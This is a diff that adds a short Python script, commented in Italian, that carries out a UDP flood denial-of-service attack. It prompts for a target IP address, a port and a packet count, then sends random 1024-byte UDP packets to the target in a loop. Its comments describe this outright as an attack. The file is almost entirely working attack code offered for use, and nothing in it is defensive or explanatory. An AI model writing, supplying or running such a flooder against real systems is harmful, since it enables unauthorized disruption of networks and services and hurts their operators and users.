@@ -1,0 +1,24 @@
+import socket    #libreria socket - per connettersi 
+import random    #libreria random - per generare dati casuali
+
+def udp_flood():        #funzione
+    packets = random._urandom(1024)     #e' la variabile per   
+                           
+    for x in range(num):             #ciclo per l'invio dei pacchetti per le volte specificate nella variabile num
+        s.sendto(packets, target)       #invia pacchetti random all'indirizzo specificato nel target
+        print("#", x, "Pacchetti inviati")
+        
+
+destination = input("Inserici l'IP di destinazione: ")              #\
+port = int(input("Inserisci la porta di destinazione: "))           # -- richiesta delle informazioni necessare per l'attacco (ip, porta e numero dei pacchetti)
+num = int(input("Inserisci il numero di pacchetti da inviare: "))   #/
+
+try:
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)     #creazione del socket - AF_INET per l'utilizzo dell' IPv4 | SOCK_DGRAM per l'utilizzo del protocollo UDP
+    target = (destination, port)          #definizione del target con IP e porta di destinazione
+except Exception as e:                    
+    print("Errore nella creazione del socket: ", e) 
+    s.close()
+    exit()
+
+udp_flood()       #richiamo della funzione
